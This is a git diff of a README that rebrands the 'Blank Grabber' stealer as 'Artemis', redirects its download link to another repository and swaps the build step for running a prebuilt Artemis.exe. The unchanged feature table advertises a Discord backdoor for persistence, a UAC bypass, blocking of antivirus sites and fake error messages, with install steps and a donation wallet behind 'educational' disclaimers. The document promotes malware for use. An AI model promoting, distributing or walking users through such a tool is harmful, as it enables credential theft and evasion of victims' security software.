@@ -18,7 +18,7 @@
 
 ## Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/avgvodkadrinker/Artemis/archive/refs/heads/main.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
@@ -73,7 +73,7 @@
 | **Melt Stub** | Deletes the stub after use. |
 | **Pump Stub** | Pumps the stub upto the provided size. |
 | **Fake Error** | Create custom (fake) error. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
+| **Block AV Sites** | Blocks AV related sites. |
 | **Discord Injection** | Puts backdoor on the Discord client for persistence. |
 | **UAC Bypass** | Tries to get administrator permissions without showing any prompt. |
 
@@ -90,9 +90,9 @@
 
 1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
-3. [Download Blank Grabber](#download).
+3. [Download Artemis](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
-5. Navigate to the **Artemis** folder and double click *Builder.bat* file.
+5. Navigate to the **Artemis** folder and double click *Artemis.exe* file.
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
 
 ## Support the Project
@@ -101,3 +101,6 @@ If you find this project useful and would like to show your support, you can mak
 
 - **Bitcoin (BTC):**
   - Wallet Address: bc1qnuu8la377gks2lhehkkqvlzatx0excyj622sua
+ 
+
+*I am **NOT** legally or morally responsible for any damages caused by the enduser i am only providing an educational experiance*
